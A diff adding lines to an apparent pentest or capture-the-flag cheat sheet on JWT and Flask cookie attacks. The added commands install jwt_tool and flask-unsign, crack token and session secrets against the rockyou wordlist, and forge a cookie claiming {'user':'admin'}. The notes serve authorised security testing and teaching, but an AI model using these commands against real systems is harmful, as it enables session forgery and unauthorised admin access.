@@ -7,6 +7,17 @@ jwt_tool TOKEN
 jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
 ```
 
+Tool: https://github.com/ticarpi/jwt_tool
+
+```bash
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+python3 -m pip install -r requirements.txt
+python3 jwt_tool.py TOKEN
+python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py TOKEN -T
+```
+
 Decode by hand:
 
 ```bash
@@ -119,8 +130,12 @@ Minimal JWKS:
 
 Use when source leaks `SECRET_KEY`.
 
+Tool: https://github.com/paradoxis/flask-unsign
+
 ```bash
+python3 -m pip install flask-unsign[wordlist]
 flask-unsign --decode --cookie 'COOKIE'
+flask-unsign --unsign --cookie 'COOKIE' --wordlist /usr/share/wordlists/rockyou.txt
 flask-unsign --sign --secret 'SECRET_KEY' --cookie "{'user':'admin'}"
 ```
 
